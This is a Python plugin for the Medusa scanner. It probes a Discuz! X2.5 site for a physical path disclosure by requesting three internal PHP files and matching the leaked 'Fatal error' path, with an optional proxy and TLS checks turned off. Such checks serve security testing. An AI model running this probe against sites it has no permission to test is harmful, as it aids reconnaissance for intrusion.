#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: discuz! X2.5 物理路径泄露漏洞
referer: http://www.uedbox.com/discuzx25-explosive-path/
author: Ascotbe
reference: Lucifer
description: 报错导致路径泄露。
'''
import urllib
import requests
import re

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port
#
payloads = ["/uc_server/control/admin/db.php",
			"/source/plugin/myrepeats/table/table_myrepeats.php",
			"/install/include/install_lang.php"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            for payload in payloads:
                payload_url = scheme+"://"+url+payload
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
                con = resp.text
                code = resp.status_code
                pattern = re.search('Fatal error.* in <b>([^<]+)</b> on line <b>(\d+)</b>', con)
                if pattern:
                    Medusa = "{} 存在Discuz! X2.5 物理路径泄露漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                    return (Medusa)
        elif ProxyIp==None:
            for payload in payloads:
                payload_url = scheme+"://"+url+payload
                resp = requests.get(payload_url, headers=headers, timeout=5, verify=False)
                con = resp.text
                code = resp.status_code
                pattern = re.search('Fatal error.* in <b>([^<]+)</b> on line <b>(\d+)</b>', con)
                if pattern:
                    Medusa = "{} 存在Discuz! X2.5 物理路径泄露漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                    return (Medusa)
    except Exception as e:
        pass